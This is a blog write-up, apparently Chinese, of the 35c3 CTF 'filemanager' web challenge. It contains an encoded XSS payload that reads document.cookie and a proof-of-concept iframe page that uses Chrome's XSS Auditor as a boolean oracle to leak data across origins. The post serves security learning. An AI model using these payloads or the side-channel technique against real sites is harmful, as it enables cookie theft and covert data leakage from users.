---
title: 从35c3CTF的filemanager题目中学到的一个小tips
url: 747.html
id: 747
categories:
  - hack_ctf
date: 2018-12-30 12:01:27
tags:
  - 35c3CTF
  - CTF
---


再一次被国际赛血虐.... 真是太菜了。回到正题上来，看一次35c3的filemanger题目。
题目应该还没有关：
<!--more-->

```
Solves: 5
Check out my web-based filemanager running at https://filemanager.appspot.com.

The admin is using it to store a flag, can you get it? You can reach the admin's chrome-headless at: nc 35.246.157.192 1
```

### 0x1 做题时的自己的想法

首先是测出来有一个xss漏洞，在search页面，search页面有段js如下：

```javascript
(()=>{
      for (let pre of document.getElementsByTagName('pre')) {
        let text = pre.innerHTML;
        let q = 'test';
        let idx = text.indexOf(q);
        pre.innerHTML = `${text.substr(0, idx)}<mark>${q}</mark>${text.substr(idx+q.length)}`;
      }
})();
```

q是搜索条件，如果搜到的文件内容跟q匹配，就会显示文件内容，并把q高亮显示出来。

![http://pic.wonderkun.cc/uploads/2018/12/WX20181230-111952@2x.png](http://pic.wonderkun.cc/uploads/2018/12/WX20181230-111952@2x.png)

这里q可以引发xss，测试方法：

1. 上传文件名xxxxx，内容为
```
\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65\x29\x3b\x3e
```
其实就是编码后的`<img src=x onerror=alert(document.cookie);>`

2. 搜索

```
\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65\x29\x3b\x3e
```
就会触发xss。 

但是有个利用条件，就是首先需要有一个包含

```
\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65\x29\x3b\x3e
```
的文档，显然管理员是没有的。。。
所以一直在想怎么csrf去写一个。。。创建文档的页面有个XSRF头保护，没办法csrf，就陷入了僵局。

### 0x2 正解

正解在这里[https://gist.githubusercontent.com/Jinmo/1eb258fe22daab04245cabb971111495/raw/26cda4e3a3ebbda37cf1c483240cf693a2276437/exp.html](https://gist.githubusercontent.com/Jinmo/1eb258fe22daab04245cabb971111495/raw/26cda4e3a3ebbda37cf1c483240cf693a2276437/exp.html)

根本没有用到xss，就是直接获取管理员页面，搜flag，类似于bool盲注的效果，就这么暴力。这里不再详细说这个题解了，自己去品味一下吧。

如果你看完这个题解，没有感到疑惑，甚至觉得很easy，那就没必要继续往下看了。下面说的这个问题，你肯定知道。

### 0x3 关于chrome XSS Auditor的一个小知识点

先看现象，写两个测试代码：

```php
// filename:test.php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
</head>
<body>
        <?php
            
            $password = @$_GET["password"];
            if($password=='admin'){ // 这里模拟我们要猜测的值
                echo "you get it." ;
                echo "<script>let a='test';</script>";
            }else{
                echo "guess error!" ;
            }
        ?>
        
</body>
</html>
```

```html
<!--filename:poc.html -->
<style>
        iframe {
            display: none;
        }
        </style>
        <iframe id=f></iframe>
        <div id=log></div>
        <script>
            var myframes = [];
            function go(x) {
                var f = document.createElement('iframe');
                myframes.push(f);
                document.body.appendChild(f)
                var start = performance.now()
                f.onload = function() {
                    f.onload = function() {
                        console.log("second request!");
                    }
                    console.log("first request!");
                    f.src=f.src+'#';
                }
                f.src = `http://localhost:8888/test.php?password=${encodeURIComponent(x)}&<script>let%20a=%27test%27;<\/script>`;
            }
            var payload1 = 'admin';
            var payload2 = 'test';
            go(payload1);
            go(payload2);
        </script>
```

访问`poc.html`，看到如下输出：

![http://pic.wonderkun.cc/uploads/2018/12/WX20181230-113850@2x.png](http://pic.wonderkun.cc/uploads/2018/12/WX20181230-113850@2x.png)

可以看到这里只发了3次请求，按照这个代码的写法：
```javascript
f.onload = function() {
            f.onload = function() {
               console.log("second request!");
            }
            console.log("first request!");
            f.src=f.src+'#';
}
```
按照这种写法，在url后面添加一个'#'，浏览器会认为url没有被修改，是不会再重新请求一次的。那应该是2次请求，可是为啥是3次？

其实原因很明显了，因为页面内容被XSS Auditor拦截了之后，浏览器会认为页面根本没有加载成功，所以在url后面添加一个'#'后，浏览器会再去加载一次。

看一下服务端的请求日志：

```
[Sun Dec 30 11:38:28 2018] ::1:54705 [200]: /test.php?password=admin&%3Cscript%3Elet%20a=%27test%27;%3C/script%3E
[Sun Dec 30 11:38:28 2018] ::1:54706 [200]: /test.php?password=test&%3Cscript%3Elet%20a=%27test%27;%3C/script%3E
[Sun Dec 30 11:38:28 2018] ::1:54711 [200]: /test.php?password=admin&%3Cscript%3Elet%20a=%27test%27;%3C/script%3E
```

其中 `password=admin`这个请求会触发XSS Auditor。

这就给我们一个提示，我们可以把正常页面中带有的js脚本写到url中，而错误页面是没有这个脚本的，如果页面加载正常，就会触发 XSS Auditor，这时候就给我们再发一次请求的机会，从而实现数据外带，而错误页面是不会触发XSS Auditor的，所以第二次请求就不会发出，利用这种技巧在前端实现类似于bool盲注的效果。